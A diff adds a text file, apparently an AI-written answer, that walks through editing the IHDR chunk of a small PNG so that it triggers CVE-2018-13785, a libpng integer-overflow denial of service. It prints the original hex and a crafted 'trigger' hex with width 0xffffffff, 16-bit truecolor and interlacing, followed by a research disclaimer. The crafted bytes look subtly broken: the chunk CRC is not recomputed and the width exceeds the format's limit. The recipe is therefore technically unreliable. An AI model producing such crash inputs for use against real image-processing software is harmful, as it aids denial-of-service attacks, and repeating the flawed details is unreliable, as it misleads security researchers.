@@ -1,0 +1,43 @@
+To craft a PNG file that may potentially trigger CVE-2018-13785 based on the fields relevant for invoking it (width, color type, bit depth, and interlace method), we'll need to manipulate these fields in the IHDR chunk of the provided PNG file hex representation. The IHDR chunk starts after the first 8 bytes of the PNG signature `8950 4e47 0d0a 1a0a`, and directly follows the chunk length `0000 000d`. The fields in question, located within the IHDR chunk, are:
+
+1. **Width**: 4 bytes
+2. **Height**: 4 bytes (following Width)
+3. **Bit Depth**: 1 byte (following Height)
+4. **Color Type**: 1 byte (following Bit Depth)
+5. **Compression method**: 1 byte (following Color Type, not directly related to this CVE)
+6. **Filter method**: 1 byte (following Compression method, not directly related to this CVE)
+7. **Interlace method**: 1 byte (following Filter method)
+
+Given the original hex:  
+```
+8950 4e47 0d0a 1a0a 0000 000d 4948 4452 
+0000 0001 0000 0001 0100 0000 0037 6ef9 
+2400 0000 0a49 4441 5478 0163 6000 0000 
+0200 0173 7501 1800 0000 0049 454e 44ae 
+4260 82
+```
+
+The IHDR chunk starting from `4948 4452` (IHDR magic number) includes width and height set to `0000 0001` (1), bit depth set to `01` (1 bit per sample), color type `00` (grayscale), followed by compression, filter, and interlace methods. To potentially trigger the CVE, we'll need to maximize the width, color type, and bit depth values while taking interlace into consideration, all within plausible limits.
+
+Here’s a modified version increasing width substantially, maxing out the bit depth to 16 bits for color type 2 (Truecolor), and enabling interlace:
+
+- Width = `ffffffff` (4294967295, an exaggerated value to trigger overflow)
+- Height = `0000 0001`
+- Bit depth = `10` (16 bits per sample)
+- Color type = `02` (Truecolor, which entails 3 channels)
+- Compression method, Filter method remain unchanged, and
+- Interlace Method = `01` (Adam7)
+
+Applying these modifications:
+
+```
+8950 4e47 0d0a 1a0a 0000 000d 4948 4452
+ffffffff 0000 0001 1002 0000 0137 6ef9 
+2400 0000 0a49 4441 5478 0163 6000 0000 
+0200 0173 7501 1800 0000 0049 454e 44ae 
+4260 82
+```
+
+This modification intentionally maximizes the width and uses a significant bit depth with a color type that implies multiple channels, alongside enabling interlacing. These modifications are theoretically aimed at inducing a scenario that would trigger the CVE due to an integer overflow leading to a denial of service.
+
+**Disclaimer**: This crafted hex representation is purely for educational and security research purposes, reflecting an understanding of the CVE in a theoretical context. This should not be used for malicious purposes.
